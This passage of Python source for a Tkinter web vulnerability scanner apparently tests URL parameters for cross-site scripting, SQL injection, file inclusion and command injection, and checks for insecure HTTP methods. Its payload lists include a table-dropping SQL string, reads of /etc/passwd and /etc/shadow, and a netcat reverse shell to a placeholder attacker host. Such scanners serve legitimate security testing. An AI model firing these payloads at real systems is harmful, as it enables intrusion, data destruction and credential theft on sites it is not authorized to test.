            "'; DROP TABLE users; --",
            '" OR sleep(5)--',
            "' OR 1=1--",
        ]

        lfi_payloads = [
            "../",
            "../../etc/passwd",
            "../../../../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "../../../etc/shadow",
        ]

        cmd_payloads = [
            "; ls",
            "& dir",
            "| id",
            "| whoami",
            "&& cat /etc/passwd",
            "| nc -e /bin/sh attacker.com 1234",  # placeholder, may not work everywhere
        ]

        known_favicon_hashes = {
            # MD5 hashes
            'd41d8cd98f00b204e9800998ecf8427e': 'Default (empty) favicon',
            'e99a18c428cb38d5f260853678922e03': 'WordPress default favicon',
            '5d41402abc4b2a76b9719d911017c592': 'Example hash for a known CMS favicon',
            # SHA1 hashes
            'da39a3ee5e6b4b0d3255bfef95601890afd80709': 'Empty SHA1',
        }

        for param in list(params.keys()):
            original_value = params[param][0] if params[param] else ''
            # XSS
            for payload in xss_payloads:
                test_params = dict(params)
                test_params[param] = payload
                test_url = urljoin(parsed.scheme + '://' + parsed.netloc + parsed.path, '?' + '&'.join(f"{k}={v}" for k, v in test_params.items()))
                try:
                    resp = self.session.get(test_url, timeout=timeout/2, allow_redirects=False)
                    if payload in resp.text:
                        self.add_finding(test_url, "Active XSS", f"Payload reflected: {payload}", "medium")
                except:
                    pass
            # SQLi
            for payload in sqli_payloads:
                test_params = dict(params)
                test_params[param] = original_value + payload
                test_url = urljoin(parsed.scheme + '://' + parsed.netloc + parsed.path, '?' + '&'.join(f"{k}={v}" for k, v in test_params.items()))
                try:
                    resp = self.session.get(test_url, timeout=timeout/2, allow_redirects=False)
                    error_patterns = ['syntax error', 'mysql_fetch', 'ORA-', 'SQLSTATE']
                    if any(p in resp.text for p in error_patterns):
                        self.add_finding(test_url, "Active SQLi", f"Error pattern with payload: {payload}", "high")
                except:
                    pass
            # LFI
            for payload in lfi_payloads:
                test_params = dict(params)
                test_params[param] = payload
                test_url = urljoin(parsed.scheme + '://' + parsed.netloc + parsed.path, '?' + '&'.join(f"{k}={v}" for k, v in test_params.items()))
                try:
                    resp = self.session.get(test_url, timeout=timeout/2, allow_redirects=False)
                    if 'root:' in resp.text or '[drivers]' in resp.text.lower():
                        self.add_finding(test_url, "Active LFI", "Possible LFI detected", "high")
                except:
                    pass
            # Command injection
            for payload in cmd_payloads:
                test_params = dict(params)
                test_params[param] = original_value + payload
                test_url = urljoin(parsed.scheme + '://' + parsed.netloc + parsed.path, '?' + '&'.join(f"{k}={v}" for k, v in test_params.items()))
                try:
                    resp = self.session.get(test_url, timeout=timeout/2, allow_redirects=False)
                    if 'uid=' in resp.text or 'root:' in resp.text:
                        self.add_finding(test_url, "Active Command Injection", "Command output detected", "high")
                except:
                    pass
            time.sleep(0.1)  # small delay

    def check_http_methods(self, url):
        timeout = float(self.timeout_entry.get())
        allowed_methods = []
        insecure_methods = []

        try:
            options_resp = self.session.options(url, timeout=timeout/2)
            if options_resp.status_code == 200 and 'Allow' in options_resp.headers:
                allowed = [m.strip() for m in options_resp.headers['Allow'].upper().split(',')]
                allowed_methods = allowed
                if 'PUT' in allowed:
                    insecure_methods.append('PUT')
                if 'DELETE' in allowed:
                    insecure_methods.append('DELETE')
                if 'TRACE' in allowed:
                    insecure_methods.append('TRACE')

            if 'TRACE' in allowed:
                try:
                    trace_resp = self.session.request('TRACE', url, timeout=timeout/2, headers={'Test-Header': 'TraceTest'})
                    if trace_resp.status_code == 200 and 'TraceTest' in trace_resp.text:
                        self.add_finding(url, "HTTP Methods", "TRACE method enabled and reflects headers (potential XST)", "high")
                    elif trace_resp.status_code == 200:
                        self.add_finding(url, "HTTP Methods", "TRACE method enabled", "medium")
                except:
                    pass
        except:
            pass

        if insecure_methods:
            self.add_finding(url, "HTTP Methods", f"Insecure methods allowed: {', '.join(insecure_methods)}", "medium")
        elif allowed_methods:
            self.add_finding(url, "HTTP Methods", f"Allowed methods: {', '.join(allowed_methods)}", "info")

    def check_injection_get_params(self, url, params, timeout):
        # See above for payloads
        # Already implemented in check_parameter_injection
        pass

# Run app
if __name__ == "__main__":
    root = tk.Tk()
    app = SecurityScannerGUI(root)
    root.mainloop()
